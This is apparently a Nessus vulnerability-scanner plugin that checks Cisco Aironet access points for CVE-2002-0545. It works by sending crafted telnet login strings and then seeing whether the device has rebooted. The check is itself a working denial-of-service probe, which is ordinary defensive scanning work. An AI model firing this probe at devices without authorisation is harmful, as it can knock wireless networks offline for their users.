#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(11014);
  script_version("1.28");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2002-0545");
  script_bugtraq_id(4461);

  script_name(english:"Cisco Aironet Telnet Invalid Username/Password DoS");

  script_set_attribute(attribute:"synopsis", value:
"The remote wireless access point has a denial of service
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be a Cisco Aironet wireless access point.

It was possible to reboot the AP by connecting via telnet and and
providing a specially crafted username and password. A remote attacker
could do this repeatedly to disable the device.");
  # https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20020409-aironet-telnet
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b17a4b39");
  script_set_attribute(attribute:"solution", value:
"Update to release 11.21, or disable telnet.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2004/04/09");
  script_set_attribute(attribute:"patch_publication_date", value:"2002/04/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2002/06/05");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:cisco:aironet_ap350:11.21");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_KILL_HOST);
  script_family(english:"CISCO");

  script_copyright(english:"This script is Copyright (C) 2002-2022 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports("Services/telnet", 23);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include('telnet_func.inc');

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port=get_kb_item("Services/telnet");
if(!port)port=23;


# we don't use start_denial/end_denial because they
# might be too slow (the device takes a short time to reboot)

alive = tcp_ping(port:port);
if(alive)
{
 if(!get_port_state(port))exit(0);
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 buf = telnet_negotiate(socket:soc);
 r = recv(socket:soc, length:4096);
 send(socket:soc, data:string("n3ssus", rand(), "\r\n"));
 r = recv(socket:soc, length:4096);
 send(socket:soc, data:string("n3ssus", rand(), "\r\n"));
 close(soc);

 sleep(1);
 alive = tcp_ping(port:port);
 if(!alive)security_hole(port);
}


